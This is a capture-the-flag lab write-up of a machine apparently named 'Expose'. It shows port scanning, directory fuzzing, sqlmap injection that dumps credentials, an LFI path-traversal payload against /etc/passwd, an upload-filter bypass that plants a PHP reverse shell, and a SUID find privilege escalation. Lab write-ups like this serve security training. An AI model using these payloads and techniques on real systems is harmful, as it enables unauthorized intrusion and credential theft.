To check my VPN connection was working I started with `ping -c4 10.10.116.11`. Everything seems to be working fine so let's start.
I ran `sudo nmap -sS -p- 10.10.116.111` to get an initial understanding of what ports were open on the target.

````
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 15:51 EEST
Nmap scan report for 10.10.116.111
Host is up (0.075s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
53/tcp   open  domain
1337/tcp open  waste
1883/tcp open  mqtt

Nmap done: 1 IP address (1 host up) scanned in 39.58 seconds
````


Refined my command a bit
````
nmap -sVC -p21,22,53,1337,1883 10.10.116.111
PORT     STATE SERVICE                 VERSION
21/tcp   open  ftp                     vsftpd 2.0.8 or later
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.10.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh                     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 a5:d1:b7:3c:c5:03:aa:34:f1:a6:e3:5f:b7:cd:5b:46 (RSA)
|   256 14:da:96:fc:70:45:71:e7:39:c8:0f:c3:a9:7a:87:b2 (ECDSA)
|_  256 e2:90:b5:0b:ee:f1:a1:9a:77:e1:40:cc:65:ae:66:12 (ED25519)
53/tcp   open  domain                  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
1337/tcp open  http                    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: EXPOSED
|_http-server-header: Apache/2.4.41 (Ubuntu)
1883/tcp open  mosquitto version 1.6.9
| mqtt-subscribe:
|   Topics and their most recent payloads:
|     $SYS/broker/load/connections/1min: 1.83
|     $SYS/broker/messages/sent: 13
|     $SYS/broker/heap/current: 50872
|     $SYS/broker/load/publish/sent/1min: 9.14
|     $SYS/broker/publish/bytes/sent: 55
|     $SYS/broker/load/messages/sent/5min: 2.55
|     $SYS/broker/load/sockets/5min: 0.74
|     $SYS/broker/clients/active: 1
|     $SYS/broker/load/bytes/sent/1min: 340.81
|     $SYS/broker/uptime: 682 seconds
|     $SYS/broker/load/bytes/received/15min: 4.57
|     $SYS/broker/clients/maximum: 1
|     $SYS/broker/load/publish/sent/5min: 1.96
|     $SYS/broker/load/bytes/sent/5min: 73.25
|     $SYS/broker/load/messages/received/15min: 0.20
|     $SYS/broker/load/connections/15min: 0.13
|     $SYS/broker/load/bytes/received/5min: 13.55
|     $SYS/broker/store/messages/bytes: 140
|     $SYS/broker/bytes/received: 69
|     $SYS/broker/subscriptions/count: 2
|     $SYS/broker/version: mosquitto version 1.6.9
|     $SYS/broker/store/messages/count: 30
|     $SYS/broker/load/connections/5min: 0.39
|     $SYS/broker/publish/messages/sent: 10
|     $SYS/broker/clients/inactive: 0
|     $SYS/broker/load/bytes/received/1min: 63.04
|     $SYS/broker/load/messages/sent/15min: 0.86
|     $SYS/broker/clients/disconnected: 0
|     $SYS/broker/clients/connected: 1
|     $SYS/broker/load/sockets/1min: 2.51
|     $SYS/broker/load/messages/received/1min: 2.74
|     $SYS/broker/load/sockets/15min: 0.30
|     $SYS/broker/messages/stored: 30
|     $SYS/broker/retained messages/count: 34
|     $SYS/broker/heap/maximum: 51272
|     $SYS/broker/load/publish/sent/15min: 0.66
|     $SYS/broker/clients/total: 1
|     $SYS/broker/bytes/sent: 373
|     $SYS/broker/load/messages/received/5min: 0.59
|     $SYS/broker/load/bytes/sent/15min: 24.72
|     $SYS/broker/load/messages/sent/1min: 11.88
|_    $SYS/broker/messages/received: 3
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.93 seconds
````

So there is FTP, SSH, DNS domain, waste p2p encrypted file sharing software, and MQTT which is a home automation protocol running.
FTP server allows anonymous login without a password so let's start there. There are no files but the welcome message is `220 Welcome to the Expose Web Challenge.`
Went to `http://10.10.116.111:1337` with the browser and got a blank page with "EXPOSED" in it. Let's use ffuf to try to find some directories.
`ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.116.111:1337/FUZZ`
found "/admin, /admin_101, /javascript, /phpmyadmin & /server-status".

"/admin, /admin_101 & /phpmyadmin" all have login pages but "/admin" states "Is this the right admin portal?". Testing "/admin" login does not do anything so let's look at the "/admin_101" next.
Used burp to proxy the request to a file for sqlmap to test for injection vulnerabilities. 
`sqlmap -l req --level=4 --risk=2` tells that backend server seems to be MySQL 
`sqlmap -l req --dbms=MySQL --dbs` found " expose, information_schema, mysql, performance_schema, phpmyadmin, sys" databases.
`sqlmap -l req --dbms=MySQL -D expose,mysql,phpmyadmin --tables` dumps tables from databases "expose,mysql,phpmyadmin".
I started with expose database. There were "user, config" tables so let's find out columns for "user" table. 
`sqlmap -l req --dbms=MySQL -D expose -T user --columns` found "created,email,id,password" columns so let's dump them!
````
+-----------------+----+--------------------------------------+
| email           | id | password                             |
+-----------------+----+--------------------------------------+
| hacker@root.thm | 1  | VeryDifficultPassword!!#@#@!#!@#1231 |
+-----------------+----+--------------------------------------+
````
This grants login to "/admin_101" but there is nothing.

`sqlmap -l req --dbms=MySQL -D expose -T config --dump` gives more interesting output
````
+----+------------------------------+-----------------------------------------------------+
| id | url                          | password                                            |
+----+------------------------------+-----------------------------------------------------+
| 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929                    |
| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
+----+------------------------------+-----------------------------------------------------+
````
I tried to crack hash with JohnTheRipper but it didn't work. I used crackstation.com to see if it would work, and it did. The password is "easytohack".
Tried to brute force 
````
http://10.10.116.111:1337/upload-cv00101011/index.php
````
with z starting usernames as it hints that the username starts with "z" but it didn't work.
"/file1010111/index.php" lets me in with the password "easytohack". Looking at the source code there is a "Hint: Try file or view as GET parameters?". 
It hints towards LFI(local file inclusion). Trying 
````
http://10.10.116.111:1337/file1010111/index.php?file=../../../../../../../../../etc/passwd
````
spits out the whole passwd file!

In the file is user "zeamkish", trying that on 
````
http://10.10.116.111:1337/upload-cv00101011/index.php
````
gives upload page. 
The source code tells me that there is a javascript function that only allows "jpg & png" files. Let's try to bypass it with burp.
I will create a rev.php.png file with php reverse shell inside and upload it with burp. I intercept the upload and remove ".png" extension from the reverse shell and it goes through!
The site says "File uploaded successfully! Maybe look in source code to see the path" so again I looked at the source code and found that the file went to "/upload_thm_1001".
I start a listener port the port in the reverse shell and execute our reverse shell by just clicking the file and we got our shell!

I looked at the folder I landed in but there was nothing. Checked home folders of "ubuntu" and "zeamkish". In zeamkish folder was a file named "ssh_creds.txt"!
Let's try them for ssh `ssh zeamkish@10.10.116.111` and we are in as zeamkish.

I uploaded "linpeas.sh" to help with enumeration. There is an uncommon binary with suid bit.
`-rwsr-x--- 1 root zeamkish 313K Feb 18  2020 /usr/bin/find`

I had a look at gtfobins and found that you can spawn a privileged shell with: `./find . -exec /bin/sh -p \; -quit`
The flag was `/root/flag.txt`
